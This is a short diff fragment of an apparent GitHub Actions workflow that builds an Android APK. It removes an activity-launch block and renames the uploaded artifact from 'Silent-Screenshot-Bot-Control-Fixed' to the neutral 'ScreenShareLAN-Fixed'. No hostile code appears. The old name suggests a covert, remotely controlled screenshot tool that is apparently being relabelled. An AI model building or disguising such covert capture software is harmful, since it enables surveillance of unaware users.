-                          val i = Intent(context, MainActivity::class.java).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                          context.startActivity(i)
-                      } catch (_: Exception) {}
-                  }
-              }
           }
           EOF
 
@@ -1035,5 +1012,5 @@ jobs:
       - name: Upload APK
         uses: actions/upload-artifact@v4
         with:
-          name: Silent-Screenshot-Bot-Control-Fixed
+          name: ScreenShareLAN-Fixed
           path: app/build/outputs/apk/debug/app-debug.apk
